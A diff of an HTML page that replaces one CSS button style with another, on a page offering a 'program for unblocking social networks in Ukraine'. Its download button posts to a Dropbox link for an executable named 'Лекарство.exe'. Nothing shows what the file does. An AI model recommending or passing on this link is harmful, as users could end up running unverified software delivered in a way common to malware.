@@ -26,35 +26,35 @@
    }
   </style>
   <style>
-.knopka01 {
+a.button9 {
+  position: relative;
   display: inline-block;
-  width: 100px;
-  height: 50px;
-  line-height: 50px;
-  font-size: 20px;
-  text-align: center;
+  color: #777674;
+  font-weight: bold;
   text-decoration: none;
-  text-shadow: 0 1px rgba(255,255,255,.2), 0 -1px rgba(0,0,0,.8);
-  outline: none;
-  border: none;
-  border-radius: 100px;
-  background: rgb(28,107,114) radial-gradient(150% 100% at 50% 5px, rgba(255,255,255,.2), rgba(0,0,0,0));
-  box-shadow: inset rgba(0,0,0,.6) 0 -2px 5px, inset rgba(252,255,255,.7) 0 2px 5px, rgba(0,0,0,.8) 0 2px 5px -1px;
-  color: rgb(0,79,86);
+  text-shadow: rgba(255,255,255,.5) 1px 1px, rgba(100,100,100,.3) 3px 7px 3px;
   user-select: none;
-} 
-.knopka01:hover {
-  color: rgb(0,59,66);
-  cursor: pointer;
+  padding: 1em 2em;
+  outline: none;
+  border-radius: 3px / 100%;
+  background-image:
+   linear-gradient(45deg, rgba(255,255,255,.0) 30%, rgba(255,255,255,.8), rgba(255,255,255,.0) 70%),
+   linear-gradient(to right, rgba(255,255,255,1), rgba(255,255,255,0) 20%, rgba(255,255,255,0) 90%, rgba(255,255,255,.3)),
+   linear-gradient(to right, rgba(125,125,125,1), rgba(255,255,255,.9) 45%, rgba(125,125,125,.5)),
+   linear-gradient(to right, rgba(125,125,125,1), rgba(255,255,255,.9) 45%, rgba(125,125,125,.5)),
+   linear-gradient(to right, rgba(223,190,170,1), rgba(255,255,255,.9) 45%, rgba(223,190,170,.5)),
+   linear-gradient(to right, rgba(223,190,170,1), rgba(255,255,255,.9) 45%, rgba(223,190,170,.5));
+  background-repeat: no-repeat;
+  background-size: 200% 100%, auto, 100% 2px, 100% 2px, 100% 1px, 100% 1px;
+  background-position: 200% 0, 0 0, 0 0, 0 100%, 0 4px, 0 calc(100% - 4px);
+  box-shadow: rgba(0,0,0,.5) 3px 10px 10px -10px;
 }
-.knopka01:active {
-  padding-bottom: 1px;
-  box-shadow:
-   inset rgba(0,0,0,1) 0 1px 3px,
-   inset rgba(0,0,0,.6) 0 -2px 5px,
-   inset rgba(252,255,255,.7) 0 2px 5px,
-   0 1px rgba(255,255,255,.08);
-  color: rgb(128,207,214);
+a.button9:hover {
+  transition: .5s linear;
+  background-position: -200% 0, 0 0, 0 0, 0 100%, 0 4px, 0 calc(100% - 4px);
+}
+a.button9:active {
+  top: 1px;
 }
   </style>
  </body>
@@ -64,5 +64,5 @@
 <h3>Программа для разблокировки социальных сетей в Украине</h3>
 <img src=https://unsocnet.github.io/USN.png><br>
 <form action="https://dl-web.dropbox.com/get/%D0%9B%D0%B5%D0%BA%D0%B0%D1%80%D1%81%D1%82%D0%B2%D0%BE.exe?_download_id=5694320010677222499693286575687807760880217650991843298580990378&_notify_domain=www.dropbox.com&_subject_uid=317105019&dl=1&w=AABEf0ri_a7DU8126Y69H7cAvsQ8mK_4-97N-n8CVwvzQQ" method="post">
- <input type="button" class="knopka01" value="Скачать"></form>
+ <input type="button" class="button09" value="Скачать"></form>
 
